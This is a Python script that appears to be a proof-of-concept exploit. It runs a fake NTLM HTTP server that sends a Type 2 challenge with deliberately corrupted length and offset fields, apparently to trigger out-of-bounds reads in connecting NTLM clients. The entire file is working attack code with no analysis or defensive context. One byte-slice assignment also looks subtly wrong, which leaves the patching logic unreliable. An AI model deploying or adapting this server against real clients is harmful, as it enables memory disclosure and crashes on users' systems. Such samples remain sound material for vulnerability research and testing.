import socket
import base64
import binascii
import struct
from email.utils import formatdate
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('localhost', 8001))
sock.listen(5)

      
'''
	length must be in range(0, 0x100)
	offset must be in range(0,0x100000000)
'''
def edit_len(length = 0xffff,offset = 0xffff0001):
	tmp = bytearray(base64.b64decode(b'TlRMTVNTUAACAAAADAAMADAAAAABAoEAASNFZ4mrze8AAAAAAAAAAP//YgABAP//RABPAE0AQQBJAE4AAgAMAEQATwBNAEEASQBOAAEADABTAEUAUgBWAEUAUgAEABQAZABvAG0AYQBpAG4ALgBjAG8AbQADACIAcwBlAHIAdgBlAHIALgBkAG8AbQBhAGkAbgAuAGMAbwBtAAAAAAA='))
	tmp[40:41] = struct.pack("<H",length)
	tmp[44:48] = struct.pack("<I",offset)
	return base64.b64encode(bytes(tmp))
	
	
while True:
	connection,address = sock.accept()
	connection.settimeout(50)
	while True:
		buf = connection.recv(1024)
		if buf == b'':
			break
		print ("Get value " +str(buf))
		date=formatdate(timeval=None, localtime=False, usegmt=True).encode()
		packet=b'''HTTP/1.1 401 Unauthorized\r\nContent-Type: text/html; charset=us-ascii\r\nServer: Microsoft-HTTPAPI/2.0\r\nWWW-Authenticate: NTLM ''' + edit_len() + b'''\r\nDate:  '''+date+b'''\r\nContent-Length: 0\r\n\r\n'''   
		print ("send type v2 msg")
		connection.send(packet)
